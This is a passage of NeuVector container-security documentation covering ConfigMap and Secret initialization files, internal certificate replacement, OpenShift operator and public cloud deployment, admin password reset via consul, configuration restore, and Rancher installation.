Client_Secret: AyAixE3... # Optional. empty or string(group filter info) GroupClaim: # Optional. empty string(openid,profile,email) Scopes: - openid - profile - email # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - custom-admin1 - custom-admin2 group_claim: groups samlinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory SSO_URL: https://... # Mandatory Issuer: https://... # Mandatory X509_Cert: | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- x509_cert_extra: - | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- # Optional. empty or string(group filter info) GroupClaim: # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - custom-admin1 - custom-admin2 group_claim: groups sysinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Optional. Choose between Discover or Monitor or Protect or empty string(Discover) New_Service_Policy_Mode: Discover # Optional. zero-drift or basic or empty string(zero-drift) New_Service_Profile_Baseline: zero-drift # Optional. input valid ipv4 address or empty string Syslog_ip: 1.2.3.4 # Optional. input 17, 6 or 66 here for udp, tcp, tcp+tls or empty string(17) Syslog_IP_Proto: 17 # Optional. it is required when Syslog_IP_Proto is 66 only Syslog_Server_Cert: | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- # Optional. empty string(514) Syslog_Port: 514 # Optional. chose between Alert/Critical/Error/Warning/Notice/Info/Debug or empty string(Info) Syslog_Level: Info # Optional. true or false or empty string(false) Syslog_status: false Syslog_Categories: # Optional. can chose multiple between event/security-event/audit or empty string - event - security-event - audit Syslog_in_json: # Optional. true, false, empty, unconfigured. # true = In Json: checkbox enabled from Settings &gt; Configuration &gt; Syslog # false, empty, unconfigured = In Json: checkbox disabled from Settings &gt; Configuration &gt; Syslog # # Optional. true or false or empty string(false) Auth_By_Platform: false single_cve_per_syslog: false syslog_cve_in_layers: false # Optional Webhooks: - name: myslack url: http... type: Slack enable: true - name: mywebhook url: http... enable: true # Optional. empty string Cluster_Name: cluster.local # Optional. chose multiple between cpath/mutex/conn/scan/cluster or empty string Controller_Debug: - cpath # Optional. true or false or empty string(true) Monitor_Service_Mesh: true # Optional. true or false or empty string(false) Registry_Http_Proxy_Status: false # Optional. true or false or empty string(false) Registry_Https_Proxy_Status: false # Optional. http/https registry proxy or empty string Registry_Http_Proxy: URL: http... Username: username Password: password Registry_Https_Proxy: URL: https... Username: username Password: password Xff_Enabled: true Net_Service_Status: false Net_Service_Policy_Mode: Discover Scanner_Autoscale: # Optional. Choose between immediate or delayed or empty string Strategy: Min_Pods: 1 Max_Pods: 3 # Optional. true or false or empty string(false) No_Telemetry_Report: false Scan_Config: # Optional. true or false or empty string(false) Auto_Scan: false # Optional. default value is 24. unit is hour and range is between 0 and 168 Unused_Group_Aging: 24 userinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false users: # add multiple users below - # this user will be added # Optional. EMail: user1@email.com # Mandatory. username can have ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$ Fullname: user1 # Optional. en or zh_cn or empty string(en) Locale: en # Optional. password length minimal 6, don't lead with ]`}*|&lt;&gt;!% Password: password # Optional. admin or reader or empty string(none) Role: reader # Optional. admin group or reader group or empty string Role_Domains: admin: - admin1 - admin2 reader: - reader1 - reader2 # Optional. value between 30 -- 3600 default 300 Timeout: 300 - # this user will overwrite the original admin user Fullname: admin Password: password Role: admin kind: ConfigMap metadata: name: neuvector-init namespace: neuvector   Then create the ConfigMap object:  kubectl create -f initcfg.yaml   ","version":"5.3","tagName":"h3"},{"title":"Protect Sensitive Data Using a Secret​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/deploying/production/configmap#protect-sensitive-data-using-a-secret","content":" If sensitive data is to be included in some sections of the configmap, a secret can be created for those sections with sensitive data.  For example, create the configMap for NON-sensitive sections such as passwordProfile and role:  kubectl create configmap neuvector-init --from-file=$HOME/init/passwordprofileinitcfg.yaml --from-file=$HOME/init/roleinitcfg.yaml -n neuvector   Then create a secret for sections with sensitive data, such as:  kubectl create secret generic neuvector-init --from-file=$HOME/init/eulainitcfg.yaml --from-file=$HOME/init/ldapinitcfg.yaml --from-file=$HOME/init/oidcinitcfg.yaml --from-file=$HOME/init/samlinitcfg.yaml --from-file=$HOME/init/sysinitcfg.yaml --from-file=$HOME/init/userinitcfg.yaml -n neuvector   important Remove the the pipe '|' character in each section, as shown below.  Note the removal of the pipe character below if using configmap sections in a secret, enabled set to true, and uncomment out the section to be included in the secret.  secret: # NOTE: files defined here have preferrence over the ones defined in the configmap section enabled: true data: eulainitcfg.yaml: license_key: 0Bca63Iy2FiXGqjk... # ... # ldapinitcfg.yaml: # directory: OpenLDAP # ... # oidcinitcfg.yaml: # Issuer: https://... # ... # samlinitcfg.yaml: # ... # sysinitcfg.yaml: # ... # userinitcfg.yaml: # ...   After controller is deployed, all the configuration files from both configmap and secret will be stored in /etc/config folder.  Note that the secret is referred to in the standard Kubernetes and OpenShift Controller deployment yaml files under Volumes.  ","version":"5.3","tagName":"h3"},{"title":"ConfigMaps and Persistent Storage​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/deploying/production/configmap#configmaps-and-persistent-storage","content":" Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage. ","version":"5.3","tagName":"h3"},{"title":"Replacing Internal Certificates","type":0,"sectionRef":"#","url":"/deploying/production/internal","content":"","keywords":"","version":"5.3"},{"title":"Internal Communication and Certificates​","type":1,"pageTitle":"Replacing Internal Certificates","url":"/deploying/production/internal#internal-communication-and-certificates","content":" NeuVector includes default self-signed certificates for encryption for the Manager (console/UI access), Controller (REST API, internal), Enforcer (internal), and Scanner (internal) communications.  These certificates can be replaced by your own to further harden communication. For replacing certificates used by external access to NeuVector (i.e, browser to the Manager, or REST API to the Controller), please see this section. See below for replacing the certificates used in internal communication between NeuVector containers.  warning Replacing certificates is recommended to be performed only during initial deployment of NeuVector. Replacing on a running cluster (even with rolling upgrade) may result in an unstable state where NeuVector pods are unable to communicate with each other due to a mismatch in certificates, and DATA LOSS may occur.  Replacing Certificates Used in Internal Communications of NeuVector​  Replace the internal encryption files ca.crt, tls.key, tls.crt as follows:  Create a new ca.cfg file with your favorite editor:  [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector [v3_req] keyUsage = digitalSignature, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth, clientAuth subjectAltName = @alt_names [alt_names] DNS.1 = Neuvector   info For additional information on ca.cfg, see https://open-docs.neuvector.com/configuration/console/replacecert.  Choose your scenario from the three options below:  New certificateUpdate current certificate with SANsRegenarate certificate files and add SANs If your certificate is about to expire and you need to generate a new one, follow the steps below: Delete the old ca.crt, tls.key, tls.crt, kubernetes secret, and generate new ones: kubectl delete secret internal-cert -n neuvector openssl genrsa -out ca.key 2048 openssl req -x509 -sha256 -new -nodes -key ca.key -days 3650 -out ca.crt openssl genrsa -out tls.key 2048 openssl req -new -key tls.key -sha256 -out cert.csr -config ca.cfg openssl req -in cert.csr -noout -text openssl x509 -req -sha256 -in cert.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out tls.crt -days 3650 -extensions 'v3_req' -extfile ca.cfg openssl x509 -in tls.crt -text kubectl create secret generic internal-cert -n neuvector --from-file=tls.key --from-file=tls.crt --from-file=ca.crt Then edit the Controller, Enforcer, and Scanner deployment yamls, adding: containers: - name: neuvector-controller/enforcer/scanner-pod volumeMounts: - mountPath: /etc/neuvector/certs/internal/tls.key name: internal-cert readOnly: true subPath: tls.key - mountPath: /etc/neuvector/certs/internal/tls.crt name: internal-cert readOnly: true subPath: tls.crt - mountPath: /etc/neuvector/certs/internal/ca.crt name: internal-cert readOnly: true subPath: ca.crt volumes: - name: internal-cert secret: defaultMode: 420 secretName: internal-cert Then proceed to deploy NeuVector as before. You can also shell into the controller/enforcer/scanner pods to confirm that the ca.crt, tls.key, tls.crt files are the customized ones and that the NeuVector communications are working using the new certificates. Sample patch commands for controller (change namespace to cattle-neuvector-system if needed, and modify for use on enforcer, scanner): NAMESPACE=neuvector kubectl patch deployment -n ${NAMESPACE} neuvector-controller-pod --type='json' -p='[{&quot;op&quot;: &quot;add&quot;, &quot;path&quot;: &quot;/spec/template/spec/volumes/-&quot;, &quot;value&quot;: {&quot;name&quot;: &quot;internal-cert&quot;, &quot;secret&quot;: {&quot;defaultMode&quot;: 420, &quot;secretName&quot;: &quot;internal-cert&quot;}} } ]' kubectl patch deployment -n ${NAMESPACE} neuvector-controller-pod --type='json' -p='[{&quot;op&quot;: &quot;add&quot;, &quot;path&quot;: &quot;/spec/template/spec/containers/0/volumeMounts&quot;, &quot;value&quot;: [{&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/cert.key&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;cert.key&quot;}, {&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/cert.pem&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;cert.pem&quot;}, {&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/ca.cert&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;ca.cert&quot;} ] } ]'   Updating/Deploying with Helm​  As of Helm chart 2.4.1 we can now manage the internal certificate install. The chart values.yaml should be reviewed for all the settings. The below example uses RKE2, standard Ingress and installer certificates.  # add chart helm repo add neuvector https://neuvector.github.io/neuvector-helm/ # update chart helm repo update # add domain for ingress export domain=awesome.sauce # run the helm helm upgrade -i neuvector -n neuvector neuvector/core --create-namespace --set imagePullSecrets=regsecret --set k3s.enabled=true --set k3s.runtimePath=/run/k3s/containerd/containerd.sock --set manager.ingress.enabled=true --set manager.ingress.host=neuvector.$domain --set manager.svc.type=ClusterIP --set controller.pvc.enabled=true --set controller.pvc.capacity=500Mi --set controller.internal.certificate.secret=internal-cert --set cve.scanner.internal.certificate.secret=internal-cert --set enforcer.internal.certificate.secret=internal-cert  ","version":"5.3","tagName":"h3"},{"title":"Deploy Using Operators","type":0,"sectionRef":"#","url":"/deploying/production/operators","content":"","keywords":"","version":"5.3"},{"title":"Operators​","type":1,"pageTitle":"Deploy Using Operators","url":"/deploying/production/operators#operators","content":" Operators take human operational knowledge and encode it into software that is more easily shared with consumers. Operators are pieces of software that ease the operational complexity of running another piece of software. More technically, Operators are a method of packaging, deploying, and managing a Kubernetes application.  ","version":"5.3","tagName":"h3"},{"title":"NeuVector Operators​","type":1,"pageTitle":"Deploy Using Operators","url":"/deploying/production/operators#neuvector-operators","content":" The NeuVector Operator is based on the NeuVector Helm chart. The NeuVector RedHat OpenShift Operator runs in the OpenShift container platform to deploy and manage the NeuVector Security cluster components. The NeuVector Operator contains all necessary information to deploy NeuVector using Helm charts. You simply need to install the NeuVector operator from the OpenShift embedded Operator hub and create the NeuVector instance.  To deploy the latest NeuVector container versions, please use either the Red Hat Certified Operator from Operator Hub or the community operator. Documentation for the community operator can be found here.  Note about SCC and Upgrading  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged   important NeuVector Certified Operator versions are tied to NeuVector product versions, and each new version must go through a certification process with Red Hat before being published. Certified operator version for 5.3.x is tied to helm version 2.7.2 and NeuVector app version 5.3.2. Certified operator version 1.3.9 is tied to NeuVector version 5.2.0. Certified operator version 1.3.7 is tied to NeuVector version 5.1.0. Version 1.3.4 operator version is tied to NeuVector 5.0.0. If you wish to be able to change the version tags of the NeuVector containers deployed, please use the Community version.  Deploy Using Certified Operator Deploy Using the Red Hat Certified Operator from Operator Hub important NeuVector Operator versions are tied to NeuVector product versions, and each new product version must go through a certification process with Red Hat before being published. Technical notes NeuVector container images are pulled from registry.connect.redhat.com using the RedHat market place image pull secret.The NeuVector manager UI is typically exposed via an OpenShift passthrough route on a domain. For example, on IBM Cloud neuvector-route-webui-neuvector.(cluster_name)-(random_hash)-0000.(region).containers.appdomain.cloud. It can also be exposed as the service neuvector-service-webui through a node port address or public IP.OpenShift version &gt;=4.6. Create the project neuvector. oc new-project neuvector Install the RedHat Certified Operator from the Operator Hub In the OpenShift Console UI, navigate to OperatorHubSearch for NeuVector Operator and select the listing without community or marketplace badgeClick Install Configure update channel Current latest channel is beta, but may be moved to stable in the futureSelect stable if available Configure installation mode and installed namespace Select specific namespace on the clusterSelect neuvector as installed namespaceConfigure approval strategy Confirm Install Prepare the YAML configuration values for the NeuVector installation as shown in the sample screen shot below. The YAML presented in the OpenShift Console provides all available configuration options and their default values. When the operator is installed and ready for use, a NeuVector instance can be installed. Click View operator (after the operator installation) or select the NeuVector Operator from the Installed operators viewClick Create instanceSelect Configure via YAML ViewPaste the prepared YAML configuration valuesClick Create Verify the installation of the NeuVector instance Navigate to the Operator Details of the NeuVector OperatorOpen the NeuVector tabSelect the neuvector-default instanceOpen the Resources tabVerify that resources are in status Created or Running After you have successfully deployed the NeuVector Platform to your cluster, login to the NeuVector console at https://neuvector-route-webui-neuvector.(OC_INGRESS). Login with the initial username admin and password admin.Accept the NeuVector end user license agreement.Change the password of the admin user. Optionally, you can also create additional users in the Settings -&gt; Users &amp; Roles menu. Now you are ready to navigate the NeuVector console to start vulnerability scanning, observe running application pods, and apply security protections to containers. Upgrading NeuVector Upgrade the NeuVector version by updating the Operator version which is associated with the desired NeuVector version.  Deploy Using Community Operator Deploy Using the NeuVector Community Operator from Operator Hub Technical notes NeuVector container images are pulled from Docker Hub from the NeuVector account.NeuVector manager UI is typically exposed via an OpenShift passthrough route on a domain. For example, on IBM Cloud neuvector-route-webui-neuvector.(cluster_name)-(random_hash)-0000.(region).containers.appdomain.cloud. It can also be exposed as the service neuvector-service-webui through a node port address or public IP.OpenShift version 4.6+It is recommendeded to review and modify the NeuVector installation configuration by modifying the yaml values before creating the NeuVector instance. Examples include imagePullSecrets name, tag version, ingress/console access, multi-cluster federation, persistent volume PVC etc. Please refer to the Helm instructions at https://github.com/neuvector/neuvector-helm for the values that can be modified during installation. Create the project neuvector oc new-project neuvector Install the NeuVector Community Operator from the Operator Hub In the OpenShift Console UI, navigate to OperatorHubSearch for NeuVector Operator and select the listing with the community badgeClick InstallConfigure update channel. Current latest channel is beta, but may be moved to stable in the future. Select stable if available.Configure installation mode and installed namespaceSelect specific namespace on the clusterSelect neuvector as installed namespaceConfigure approval strategyConfirm Install Download the Kubernetes secret manifest which contains the credentials to access the NeuVector container registry. Save the YAML manifest file to ./neuvector-secret-registry.yaml. Apply the Kubernetes secret manifest containing the registry credentials. kubectl apply -n neuvector -f ./neuvector-secret-registry.yaml Prepare the YAML configuration values for the NeuVector installation starting from the following YAML snippet. Be sure to specify the desired NeuVector version in the 'tag' value. Check the reference of values in the NeuVector Helm chart to get available configuration options. There are other possible Helm values which can be configured in the YAML, such as whether you will configure the cluster to allow multi-cluster management by exposing the Master (Federated Master) or remote (Federated Worker) services. apiVersion: apm.neuvector.com/v1alpha1 kind: Neuvector metadata: name: neuvector-default namespace: neuvector spec: openshift: true tag: 4.3.0 registry: docker.io exporter: image: repository: prometheus-exporter tag: 0.9.0 manager: enabled: true env: ssl: true image: repository: manager svc: type: ClusterIP route: enabled: true termination: passthrough enforcer: enabled: true image: repository: enforcer cve: updater: enabled: true image: repository: updater tag: latest schedule: 0 0 * * * scanner: enabled: true replicas: 3 image: repository: scanner tag: latest controller: enabled: true image: repository: controller replicas: 3 When the operator is installed and ready for use, a NeuVector instance can be installed. Click View operator (after the operator installation) or select the NeuVector Operator from the Installed operators viewClick Create instanceSelect Configure via YAML ViewPaste the prepared YAML configuration valuesClick Create Verify the installation of the NeuVector instance. Navigate to the Operator Details of the NeuVector OperatorOpen the NeuVector tabSelect the neuvector-default instanceOpen the Resources tabVerify that resources are in status Created or Running After you have successfully deployed the NeuVector Platform to your cluster, login to the NeuVector console at https://neuvector-route-webui-neuvector.(INGRESS_DOMAIN). Login with the initial username admin and password admin.Accept the NeuVector end user license agreement.Change the password of the admin user.Optionally, you can also create additional users in the Settings -&gt; Users &amp; Roles menu. Now you are ready to navigate the NeuVector console to start vulnerability scanning, observe running application pods, and apply security protections to containers. Upgrading NeuVector From Operators &gt; Installed Operators &gt; NeuVector Operator Click on NeuVector to list instances Click on YAML to edit parameters Update tag and click Save  ","version":"5.3","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Deploy Using Operators","url":"/deploying/production/operators#troubleshooting","content":" Check the Operator deployment values in the deployed yaml fileVerify that security context constraint (SCC) for NeuVector in step 2 was successfully addedReview and check the NeuVector Helm chart valuesMake sure the registry path and version tag is set properly (community operator; certified will use the defaults)Make sure the route to the NeuVector manager service neuvector-route-webui is configured ","version":"5.3","tagName":"h3"},{"title":"Public Cloud K8s AKS, EKS, GKE, IBM...","type":0,"sectionRef":"#","url":"/deploying/publick8s","content":"","keywords":"","version":"5.3"},{"title":"Deploy NeuVector on a Public Cloud Kubernetes Service​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/deploying/publick8s#deploy-neuvector-on-a-public-cloud-kubernetes-service","content":" Deploy NeuVector on any public cloud K8s service such as AWS EKS, Azure AKS, IBM Cloud K8s, Google Cloud, Alibaba Cloud or Oracle Cloud. NeuVector has passed the Amazon EKS Anywhere Conformance and Validation Framework and, as such, is a validated solution and is available as an Add-on for EKS-Anywhere on Snowball Edge devices through the AWS Console.  First, create your K8s cluster and confirm access with kubectl get nodes.  To deploy NeuVector use the sample deployment instructions and examples from the Kubernetes section of the Production Deployment. Edit the sample yaml if you are pulling NeuVector images from a local or cloud registry such as ECR or ACR.  Some cloud providers have integrated load balancers which are easy to deploy by using Type: LoadBalancer instead of NodePort for the NeuVector webui.  NeuVector also supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Network Access​  Make sure internal and external ingress access is configured properly. For the NodePort service, the random port in the 3xxxx range must be accessible on a public IP of a worker or master node from the outside. You can access the console using the public IP address of any worker node and that port (NodePort), or the public IP of the load balancer and default port 8443. You can view the IP/port using:  kubectl get svc -n neuvector   Most K8s services automatically enable/allow all inter-pod / inter-cluster communication between nodes which also enable the NeuVector containers (enforcers, controllers, manager) to communicate within the cluster.  The sample Kubernetes yaml file will deploy one manager and 3 controllers. It will deploy an enforcer on every node as a daemonset. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  ","version":"5.3","tagName":"h3"},{"title":"Microsoft Azure AKS​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/deploying/publick8s#microsoft-azure-aks","content":" When deploying a k8s cluster on Azure, the default for Kubernetes RBACs is off. Please enable RBACs to enable the cluster-admin clusterrole, otherwise you will need to create that manually later to support Helm based deployments.  ","version":"5.3","tagName":"h3"},{"title":"Google Cloud Platform / GKE​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/deploying/publick8s#google-cloud-platform--gke","content":" You can use the integrated load balancers which are easy to deploy by using ‘Type: LoadBalancer’ instead of NodePort for the NeuVector webui. Configuring persistent storage with type RWM (read write many) may require creating a storage service such as NFS before deploying NeuVector.  NeuVector requires an SDN plug-in such as flannel, weave, or calico.  Use the environment variable NV_PLATFORM_INFO with value platform=Kubernetes:GKE to enable NeuVector to perform GKE specific action such as running the GKE Kubernetes CIS Benchmarks.  ","version":"5.3","tagName":"h3"},{"title":"Handling Auto-Scaling Nodes with a Pod Disruption Budget​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/deploying/publick8s#handling-auto-scaling-nodes-with-a-pod-disruption-budget","content":" Public cloud providers support the ability to auto-scale nodes, which can dynamically evict pods including the NeuVector controllers. To prevent disruptions to the controllers, a NeuVector pod disruption budget can be created.  For example, create the file below nv_pdr.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   Then  kubectl create -f nv_pdr.yaml   For more details: https://kubernetes.io/docs/tasks/run-application/configure-pdb/ ","version":"5.3","tagName":"h3"},{"title":"Removing or Resetting NeuVector","type":0,"sectionRef":"#","url":"/deploying/remove","content":"","keywords":"","version":"5.3"},{"title":"Removing NeuVector Deployment / Containers​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/deploying/remove#removing-neuvector-deployment--containers","content":" To remove the NeuVector deployment on Kubernetes, use the same yaml file for deployment in the delete command.  kubectl delete -f neuvector.yaml   This will remove the services and container deployments of NeuVector. You may also want to delete the neuvector namespace, persistent volume and cluster roles and clusterrolebindings created in the deployment steps.  If you deployed NeuVector using a Helm chart or operator you should delete NeuVector using Helm or the appropriate operator command.  ","version":"5.3","tagName":"h3"},{"title":"Resetting NeuVector to an Initial State​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/deploying/remove#resetting-neuvector-to-an-initial-state","content":" In addition to deleting as discussed above and redeploying NeuVector, the following steps can be taken in Kubernetes to reset NeuVector, which will remove learned rules, groups, and other configuration but leave the NeuVector deployment intact.  Scale the controller deployment to 0.(Optional) if a Persistent Volume is used, delete the persistent volume backup and registry folders created.Scale the controller deployment to 3.  ","version":"5.3","tagName":"h3"},{"title":"Resetting the Admin Password​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/deploying/remove#resetting-the-admin-password","content":" The admin password is the key to administering the NeuVector deployment and view the cluster network activities. It is important to change the password upon install and keep it safely guarded. Sometimes, the password is guarded too well and become loss or the administrator leaves the company. If you have kubectl access to the cluster, you can reset the admin password to the default using the following steps.  Exec into one of the controllers.  kubectl exec -it &lt;controller&gt; -n neuvector -- sh   Check that the admin entry exists and save the output json somewhere for safe keeping.  consul kv get object/config/user/admin   Take the output from the above consul kv get command and replace the password_hash string with below string.  c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec   Reset the admin account password back to the default. (REPLACE &lt;UPDATED_consul_kv_get_output_with_new_password_hash&gt; BEFORE EXECUTION!!!)  consul kv put object/config/user/admin '&lt;UPDATED_consul_kv_get_output_with_new_password_hash&gt;'   EXAMPLE BELOW: (DO NOT EXECUTE WITHOUT REPLACING WITH OUTPUT)  consul kv put object/config/user/admin '{&quot;fullname&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password_hash&quot;:&quot;c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec&quot;,&quot;pwd_reset_time&quot;:&quot;2022-03-24T20:50:15.341074451Z&quot;,&quot;pwd_hash_history&quot;:null,&quot;domain&quot;:&quot;&quot;,&quot;server&quot;:&quot;&quot;,&quot;email&quot;:&quot;&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;role_oride&quot;:false,&quot;timeout&quot;:300,&quot;locale&quot;:&quot;en&quot;,&quot;role_domains&quot;:{},&quot;last_login_at&quot;:&quot;2022-03-24T20:49:32.577877044Z&quot;,&quot;login_count&quot;:1,&quot;failed_login_count&quot;:0,&quot;block_login_since&quot;:&quot;0001-01-01T00:00:00Z&quot;}'   Response:  Success! Data written to: object/config/user/admin   Login with admin/admin and change password. ","version":"5.3","tagName":"h3"},{"title":"Restoring NeuVector Configuration","type":0,"sectionRef":"#","url":"/deploying/restore","content":"","keywords":"","version":"5.3"},{"title":"Restoring NeuVector Configuration​","type":1,"pageTitle":"Restoring NeuVector Configuration","url":"/deploying/restore#restoring-neuvector-configuration","content":" A backup of the NeuVector configuration can be applied to restore a previous configuration of NeuVector. The backup file can be generated manually as well as imported from the console in Settings -&gt; Configuration, choosing all configuration (e.g. registry configurations, integrations, other settings plus policy) or Policy only (e.g. rules/security policy). The rest API can also be used to automatically backup the configuration, as seen in this example.  Cluster events where all controllers stop running, thereby losing real-time configuration state, can be automatically restored when persistent storage has been properly configured.  note NeuVector does not support partial restoration of objects (e.g. network rules only) nor timestamped restoration (e.g. restore from date/time snapshots). Please use automation scripts to regularly backup configuration files and manage timestamps.  important The backup configuration files should not be edited in any way. Any changes to these from their exported state could result in restoration errors and an unpredictable result.  caution Backup configuration files should be used to restore a NeuVector state on the same cluster from which they were exported. Applying a backup configuration file from a different cluster could result in unpredictable results.  Recommended High Availability Settings​  Manual backup and restore of configuration should be planned only as a last resort. The following steps are recommended for high availability.  Use Helm with a ConfigMap for initial deployment and configuration.Use CRDs for defining policy such as network/process, admission control, and other rules.Run multiple controllers (minimum 3) to auto-sync configuration between running pods, and ensure they run on different hosts.Configure persistent storage (as part of step 1) to recover from any cluster wide failures where all controllers stop running.Regularly backup configuration to timestamped backup files.Restore a cluster's NeuVector configuration from a backup file as a last resort, applying any CRDs after restoration that were new or changed since the previous backup. ","version":"5.3","tagName":"h3"},{"title":"Enterprise Integration","type":0,"sectionRef":"#","url":"/integration","content":"Enterprise Integration Integrating NeuVector with enterprise infrastructure using RBAC, SYSLOG, SAML, LDAP…","keywords":"","version":"5.3"},{"title":"Rancher Deployment","type":0,"sectionRef":"#","url":"/deploying/rancher","content":"","keywords":"","version":"5.3"},{"title":"Deploy and Manage NeuVector through Rancher Extensions or Apps & Marketplace​","type":1,"pageTitle":"Rancher Deployment","url":"/deploying/rancher#deploy-and-manage-neuvector-through-rancher-extensions-or-apps--marketplace","content":" NeuVector is able to be deployed easily either through Rancher Extensions for Prime customers, or Rancher Apps and Marketplace. The default (Helm-based) NeuVector deployment will deploy NeuVector containers into the cattle-neuvector-system namespace.  Note: Only NeuVector deployments through Rancher Extensions (NeuVector) of Rancher version 2.7.0+, or Apps &amp; Marketplace of Rancher version 2.6.5+ can be managed directly (single sign on to NeuVector console) through Rancher. If adding clusters to Rancher with NeuVector already deployed, or where NeuVector has been deployed directly onto the cluster, these clusters will not be enabled for SSO integration.  NeuVector UI Extension for Rancher​  Rancher Prime customers are able to easily deploy NeuVector and the NeuVector UI Extension for Rancher. This will enable Prime users to monitor and manage certain NeuVector functions and events directly through the Rancher UI. For community users, please see the Deploy NeuVector section below to deploy from Rancher Apps and Marketplace.  The first step is to enable the Rancher Extensions capability globally if it is not already enabled. Install the NeuVector-UI-Ext from the Available list Reload the extension once installation is completed On your selected cluster, install the NeuVector application from the NeuVector tab if the NeuVector app is not already installed. This should take you to the App installation steps. For more details on this installation process, see the Deploy NeuVector section below. The NeuVector dashboard should now be shown from the NeuVector menu for that cluster. From this dashboard, a summary of the security health of the cluster can be monitored. There are interactive elements in the dashboard, such as invoking a wizard to Improve Your (Security Risk) Score, including being able to turn on automated scanning for vulnerabilities if it is not enabled.In addition, the links in the upper right of the dashboard provide convenient single sign on (SSO) links to the full NeuVector console for more detailed analysis and configuration. To uninstall the extension, go back to the Extensions pageNote: Uninstalling the NeuVector UI extension will NOT uninstall the NeuVector app from each cluster. The NeuVector menu will revert to providing an SSO link into the NeuVector console.  Deploy NeuVector​  First, find the NeuVector chart in Rancher charts, select it and review the instructions and various configuration values. (Optional) Create a project to deploy into if desired, e.g. NeuVector. Note: If you see more than one NeuVector chart, don't select the one that is for upgrading legacy NeuVector 4.x Helm chart deployments.    Deploy the NeuVector chart, first configuring appropriate values for a Rancher deployment, such as:  Container run-time, e.g. docker for RKE and containerd for RKE2, or select the K3s value if using K3s.Manager service type: change to LoadBalancer if available on public cloud deployments. If access is only desired through Rancher, any allowed value will work here. See the Important note below about changing the default admin password in NeuVector.Indicate if this cluster will be either a multi-cluster federated Primary, or remote (or select both if either option is desired).Persistent volume for configuration backups    Click 'Install' after you have reviewed and updated any chart values.  After successful NeuVector deployment, you will see a summary of the deployments, daemon sets, and cron job for NeuVector. You will also be able to see the services deployed in the Services Discovery menu on the left.    Manage NeuVector​  You will now see a NeuVector menu item in the left, and selecting that will show a 